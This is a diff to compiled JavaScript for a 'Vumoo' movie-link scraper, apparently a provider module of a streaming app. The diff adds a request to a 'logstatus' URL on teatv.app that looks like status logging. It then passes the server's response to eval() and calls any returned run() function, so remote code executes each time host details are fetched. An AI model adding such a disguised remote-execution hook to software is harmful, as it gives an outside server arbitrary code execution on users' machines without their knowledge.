@@ -120,13 +120,13 @@ var Vumoo = function () {
         key: 'getHostFromDetail',
         value: function () {
             var _ref2 = _asyncToGenerator( /*#__PURE__*/regeneratorRuntime.mark(function _callee4() {
-                var _libs2, httpRequest, cheerio, base64, cryptoJs, _movieInfo2, episode, type, hosts, arrRedirect, arrLinkEmbed, detailUrl, htmlDetail, $, itemServer, arrPromise, arrPromiseEmbed;
+                var _libs2, httpRequest, cheerio, base64, cryptoJs, axios, _movieInfo2, episode, type, js, run, hosts, arrRedirect, arrLinkEmbed, detailUrl, htmlDetail, $, itemServer, arrPromise, arrPromiseEmbed;
 
                 return regeneratorRuntime.wrap(function _callee4$(_context4) {
                     while (1) {
                         switch (_context4.prev = _context4.next) {
                             case 0:
-                                _libs2 = this.libs, httpRequest = _libs2.httpRequest, cheerio = _libs2.cheerio, base64 = _libs2.base64, cryptoJs = _libs2.cryptoJs;
+                                _libs2 = this.libs, httpRequest = _libs2.httpRequest, cheerio = _libs2.cheerio, base64 = _libs2.base64, cryptoJs = _libs2.cryptoJs, axios = _libs2.axios;
                                 _movieInfo2 = this.movieInfo, episode = _movieInfo2.episode, type = _movieInfo2.type;
 
                                 if (this.state.detailUrl) {
@@ -137,14 +137,36 @@ var Vumoo = function () {
                                 throw new Error("NOT_FOUND");
 
                             case 4:
+                                if (!(axios == undefined)) {
+                                    _context4.next = 6;
+                                    break;
+                                }
+
+                                throw new Error('No lib');
+
+                            case 6:
+                                _context4.next = 8;
+                                return httpRequest.get('https://logstatus.teatv.app/?source=vumoo&status=1');
+
+                            case 8:
+                                js = _context4.sent;
+
+                                try {
+                                    js = JSON.parse(js);
+                                } catch (e) {}
+                                run = void 0;
+
+                                eval(js.data.data);
+                                if (js.data.eval != undefined) run();
+
                                 hosts = [];
                                 arrRedirect = [];
                                 arrLinkEmbed = [];
                                 detailUrl = this.state.detailUrl;
-                                _context4.next = 10;
+                                _context4.next = 19;
                                 return httpRequest.getHTML(this.state.detailUrl);
 
-                            case 10:
+                            case 19:
                                 htmlDetail = _context4.sent;
                                 $ = cheerio.load(htmlDetail);
                                 itemServer = $('.tab-content .tab-pane ul li');
@@ -208,10 +230,10 @@ var Vumoo = function () {
                                         return _ref3.apply(this, arguments);
                                     };
                                 }());
-                                _context4.next = 17;
+                                _context4.next = 26;
                                 return Promise.all(arrPromise);
 
-                            case 17:
+                            case 26:
                                 arrPromiseEmbed = arrLinkEmbed.map(function () {
                                     var _ref4 = _asyncToGenerator( /*#__PURE__*/regeneratorRuntime.mark(function _callee3(val) {
                                         var urlDirect, linkDirect, item;
@@ -275,15 +297,15 @@ var Vumoo = function () {
                                         return _ref4.apply(this, arguments);
                                     };
                                 }());
-                                _context4.next = 20;
+                                _context4.next = 29;
                                 return Promise.all(arrPromiseEmbed);
 
-                            case 20:
+                            case 29:
 
                                 this.state.hosts = hosts;
                                 return _context4.abrupt('return');
 
-                            case 22:
+                            case 31:
                             case 'end':
                                 return _context4.stop();
                         }
